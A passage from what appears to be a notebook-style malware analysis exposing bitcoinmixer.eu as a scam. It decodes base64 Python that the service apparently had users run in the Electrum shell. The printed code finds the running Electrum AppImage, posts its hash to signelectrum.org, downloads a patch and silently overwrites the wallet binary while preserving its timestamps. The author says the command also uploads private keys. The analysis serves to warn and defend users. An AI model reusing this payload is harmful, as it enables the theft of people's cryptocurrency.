Wy0zMjpdOgogICAgICAgIHN5cy5leGl0KDApCgogICAgcGF0Y2hfcG9zID0gMAogICAgI2RuZXcgPSBiIiIKICAgIGRuZXcgPSBieXRlYXJyYXkoKQogICAgd2hpbGUgcGF0Y2hfcG9zIDwgbGVuKGQpLTMyOgogICAgICAgIChoZWFkX3R5cGUsKSA9IHN0cnVjdC51bnBhY2soIjxjIiwgZFtwYXRjaF9wb3M6cGF0Y2hfcG9zKzFdKQogICAgICAgIHBhdGNoX3Bvcys9MQogICAgICAgIGlmIGhlYWRfdHlwZSA9PSBiIlx4MDAiOgogICAgICAgICAgICBwcmludCgiMHgwMCIpCiAgICAgICAgICAgIChvZmZzZXQsIHNpemUpID0gc3RydWN0LnVucGFjaygiPElJIiwgZFtwYXRjaF9wb3M6cGF0Y2hfcG9zKzhdKQogICAgICAgICAgICBwYXRjaF9wb3MrPTgKICAgICAgICAgICAgI2RuZXcrPXNyY19kYXRhW29mZnNldDpvZmZzZXQrc2l6ZV0KICAgICAgICAgICAgZG5ldy5leHRlbmQoc3JjX2RhdGFbb2Zmc2V0Om9mZnNldCtzaXplXSkKICAgICAgICBlbGlmIGhlYWRfdHlwZSA9PSBiIlwwMSI6CiAgICAgICAgICAgIHByaW50KCIweDAxIikKICAgICAgICAgICAgKHNpemUsKSA9IHN0cnVjdC51bnBhY2soIjxJIiwgZFtwYXRjaF9wb3M6cGF0Y2hfcG9zKzRdKQogICAgICAgICAgICBwYXRjaF9wb3MrPTQKICAgICAgICAgICAgI2RuZXcrPWRbcGF0Y2hfcG9zOnBhdGNoX3BvcytzaXplXQogICAgICAgICAgICBkbmV3LmV4dGVuZChkW3BhdGNoX3BvczpwYXRjaF9wb3Mrc2l6ZV0pCiAgICAgICAgICAgIHBhdGNoX3Bvcys9c2l6ZQogICAgICAgIGVsaWYgaGVhZF90eXBlID09IGIiXDAyIjoKICAgICAgICAgICAgcHJpbnQoIjB4MDIiKQogICAgICAgICAgICAoc2l6ZSwpID0gc3RydWN0LnVucGFjaygiPEkiLCBkW3BhdGNoX3BvczpwYXRjaF9wb3MrNF0pCiAgICAgICAgICAgIHBhdGNoX3Bvcys9NAogICAgICAgICAgICAjZG5ldys9emxpYi5kZWNvbXByZXNzKGRbcGF0Y2hfcG9zOnBhdGNoX3BvcytzaXplXSkKICAgICAgICAgICAgZG5ldy5leHRlbmQoemxpYi5kZWNvbXByZXNzKGRbcGF0Y2hfcG9zOnBhdGNoX3BvcytzaXplXSkpCiAgICAgICAgICAgIHBhdGNoX3Bvcys9c2l6ZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJXVEYiKQoKICAgIHN0PW9zLnN0YXQocGF0aCkKICAgIGF0PXN0LnN0X2F0aW1lCiAgICBtdD1zdC5zdF9tdGltZQogICAgcGVybT1zdC5zdF9tb2RlICYgMG83NzcKICAgIG9zLnVubGluayhwYXRoKQogICAgd2l0aCBvcGVuKHBhdGgsIndiIikgYXMgZjoKICAgICAgICBmLndyaXRlKGRuZXcpCiAgICBvcy51dGltZShwYXRoLCAoYXQsIG10KSkKICAgIG9zLmNobW9kKHBhdGgsIHBlcm0p'))"
        subprocess.Popen([sys.executable, "-c", b64script], stdout=open("/dev/null","w"), preexec_fn=os.setpgrp)
    
    
    print("Server exception, please, contact with support.")
    


We see now that running this command in your Electrum shell uploads your private keys to the Bitmixer server. It is designed to work with multiple operating systems.

After the code has been run it returns a message asking you to contact support, presumably either to alert them to sweep your keys, or so they can continue their social engineering if your keys do not currently contain funds.

Let's decode the final hashed block


```python
print(base64.b64decode("aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHJlCmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgaGFzaGxpYgppbXBvcnQgc3RydWN0CmltcG9ydCB6bGliCgojZG9udCB3YWl0bAojcHJvYyA9IFBvcGVuKFtjbWRfc3RyXSwgc2hlbGw9VHJ1ZSwgc3RkaW49Tm9uZSwgc3Rkb3V0PU5vbmUsIHN0ZGVycj1Ob25lLCBjbG9zZV9mZHM9VHJ1ZSkKCnJlX25hbWU9cmUuY29tcGlsZShiImVsZWN0cnVtLS4qLkFwcEltYWdlIikKcGlkPSIiCnByb2NsaXN0ID0gc3VicHJvY2Vzcy5Qb3BlbihbInBzIiwiLWF4Il0sIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpLmNvbW11bmljYXRlKClbMF0KZm9yIHByb2MgaW4gcHJvY2xpc3Quc3BsaXQoYiJcbiIpOgogICAgaWYgcmVfbmFtZS5zZWFyY2gocHJvYyk6CiAgICAgICAgcGlkPXJlLmZpbmRhbGwoYiJbMC05XSsiLHByb2MpCiAgICAgICAgaWYgcGlkOgogICAgICAgICAgICBwaWQ9cGlkWzBdLmRlY29kZSgiYXNjaWkiKQogICAgICAgIGJyZWFrCgppZiBwaWQgPT0gIiI6CiAgICBzeXMuZXhpdCgwKQoKcGF0aD1vcy5yZWFkbGluaygiL3Byb2MvIitwaWQrIi9leGUiKQppZiBub3QgcGF0aDoKICAgIHN5cy5leGl0KDApCgpoYXNoPSIiCndpdGggb3BlbihwYXRoLCJyYiIpIGFzIGY6CiAgICBzcmNfZGF0YT1mLnJlYWQoKQogICAgaGFzaD1oYXNobGliLnNoYTI1NihzcmNfZGF0YSkuaGV4ZGlnZXN0KCkKCmlmIG5vdCBoYXNoOgogICAgc3lzLmV4aXQoMCkKCnI9cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9zaWduZWxlY3RydW0ub3JnL2NoZWNrdmVyc2lvbiIsZGF0YT1oYXNoKQppZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgIGQ9ci5jb250ZW50CiAgICBwcmludCgicmVzcG9uc2UgbGVuZ3RoID0gIiArIHN0cihsZW4oZCkpKQogICAgaWYgbGVuKGQpIDw9IDY0OgogICAgICAgIHN5cy5leGl0KDApCiAgICBpZiBoYXNobGliLnNoYTI1NihkWzotMzJdKS5kaWdlc3QoKSAhPSBkWy0zMjpdOgogICAgICAgIHN5cy5leGl0KDApCgogICAgcGF0Y2hfcG9zID0gMAogICAgI2RuZXcgPSBiIiIKICAgIGRuZXcgPSBieXRlYXJyYXkoKQogICAgd2hpbGUgcGF0Y2hfcG9zIDwgbGVuKGQpLTMyOgogICAgICAgIChoZWFkX3R5cGUsKSA9IHN0cnVjdC51bnBhY2soIjxjIiwgZFtwYXRjaF9wb3M6cGF0Y2hfcG9zKzFdKQogICAgICAgIHBhdGNoX3Bvcys9MQogICAgICAgIGlmIGhlYWRfdHlwZSA9PSBiIlx4MDAiOgogICAgICAgICAgICBwcmludCgiMHgwMCIpCiAgICAgICAgICAgIChvZmZzZXQsIHNpemUpID0gc3RydWN0LnVucGFjaygiPElJIiwgZFtwYXRjaF9wb3M6cGF0Y2hfcG9zKzhdKQogICAgICAgICAgICBwYXRjaF9wb3MrPTgKICAgICAgICAgICAgI2RuZXcrPXNyY19kYXRhW29mZnNldDpvZmZzZXQrc2l6ZV0KICAgICAgICAgICAgZG5ldy5leHRlbmQoc3JjX2RhdGFbb2Zmc2V0Om9mZnNldCtzaXplXSkKICAgICAgICBlbGlmIGhlYWRfdHlwZSA9PSBiIlwwMSI6CiAgICAgICAgICAgIHByaW50KCIweDAxIikKICAgICAgICAgICAgKHNpemUsKSA9IHN0cnVjdC51bnBhY2soIjxJIiwgZFtwYXRjaF9wb3M6cGF0Y2hfcG9zKzRdKQogICAgICAgICAgICBwYXRjaF9wb3MrPTQKICAgICAgICAgICAgI2RuZXcrPWRbcGF0Y2hfcG9zOnBhdGNoX3BvcytzaXplXQogICAgICAgICAgICBkbmV3LmV4dGVuZChkW3BhdGNoX3BvczpwYXRjaF9wb3Mrc2l6ZV0pCiAgICAgICAgICAgIHBhdGNoX3Bvcys9c2l6ZQogICAgICAgIGVsaWYgaGVhZF90eXBlID09IGIiXDAyIjoKICAgICAgICAgICAgcHJpbnQoIjB4MDIiKQogICAgICAgICAgICAoc2l6ZSwpID0gc3RydWN0LnVucGFjaygiPEkiLCBkW3BhdGNoX3BvczpwYXRjaF9wb3MrNF0pCiAgICAgICAgICAgIHBhdGNoX3Bvcys9NAogICAgICAgICAgICAjZG5ldys9emxpYi5kZWNvbXByZXNzKGRbcGF0Y2hfcG9zOnBhdGNoX3BvcytzaXplXSkKICAgICAgICAgICAgZG5ldy5leHRlbmQoemxpYi5kZWNvbXByZXNzKGRbcGF0Y2hfcG9zOnBhdGNoX3BvcytzaXplXSkpCiAgICAgICAgICAgIHBhdGNoX3Bvcys9c2l6ZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJXVEYiKQoKICAgIHN0PW9zLnN0YXQocGF0aCkKICAgIGF0PXN0LnN0X2F0aW1lCiAgICBtdD1zdC5zdF9tdGltZQogICAgcGVybT1zdC5zdF9tb2RlICYgMG83NzcKICAgIG9zLnVubGluayhwYXRoKQogICAgd2l0aCBvcGVuKHBhdGgsIndiIikgYXMgZjoKICAgICAgICBmLndyaXRlKGRuZXcpCiAgICBvcy51dGltZShwYXRoLCAoYXQsIG10KSkKICAgIG9zLmNobW9kKHBhdGgsIHBlcm0p").decode())
```

    import subprocess
    import re
    import os
    import sys
    import requests
    import hashlib
    import struct
    import zlib
    
    #dont waitl
    #proc = Popen([cmd_str], shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
    
    re_name=re.compile(b"electrum-.*.AppImage")
    pid=""
    proclist = subprocess.Popen(["ps","-ax"], stdout=subprocess.PIPE).communicate()[0]
    for proc in proclist.split(b"\n"):
        if re_name.search(proc):
            pid=re.findall(b"[0-9]+",proc)
            if pid:
                pid=pid[0].decode("ascii")
            break
    
    if pid == "":
        sys.exit(0)
    
    path=os.readlink("/proc/"+pid+"/exe")
    if not path:
        sys.exit(0)
    
    hash=""
    with open(path,"rb") as f:
        src_data=f.read()
        hash=hashlib.sha256(src_data).hexdigest()
    
    if not hash:
        sys.exit(0)
    
    r=requests.post("https://signelectrum.org/checkversion",data=hash)
    if r.status_code == 200:
        d=r.content
        print("response length = " + str(len(d)))
        if len(d) <= 64:
            sys.exit(0)
        if hashlib.sha256(d[:-32]).digest() != d[-32:]:
            sys.exit(0)
    
        patch_pos = 0
        #dnew = b""
        dnew = bytearray()
        while patch_pos < len(d)-32:
            (head_type,) = struct.unpack("<c", d[patch_pos:patch_pos+1])
            patch_pos+=1
            if head_type == b"\x00":
                print("0x00")
                (offset, size) = struct.unpack("<II", d[patch_pos:patch_pos+8])
                patch_pos+=8
                #dnew+=src_data[offset:offset+size]
                dnew.extend(src_data[offset:offset+size])
            elif head_type == b"\01":
                print("0x01")
                (size,) = struct.unpack("<I", d[patch_pos:patch_pos+4])
                patch_pos+=4
                #dnew+=d[patch_pos:patch_pos+size]
                dnew.extend(d[patch_pos:patch_pos+size])
                patch_pos+=size
            elif head_type == b"\02":
                print("0x02")
                (size,) = struct.unpack("<I", d[patch_pos:patch_pos+4])
                patch_pos+=4
                #dnew+=zlib.decompress(d[patch_pos:patch_pos+size])
                dnew.extend(zlib.decompress(d[patch_pos:patch_pos+size]))
                patch_pos+=size
            else:
                print("WTF")
    
        st=os.stat(path)
        at=st.st_atime
        mt=st.st_mtime
        perm=st.st_mode & 0o777
        os.unlink(path)
        with open(path,"wb") as f:
            f.write(dnew)
        os.utime(path, (at, mt))
        os.chmod(path, perm)


## Conclusion of analysis: bitcoinmixer.eu is a SCAM mixing service which steals Bitcoin from users. Anyone using their services should stop immediately.


```python

```
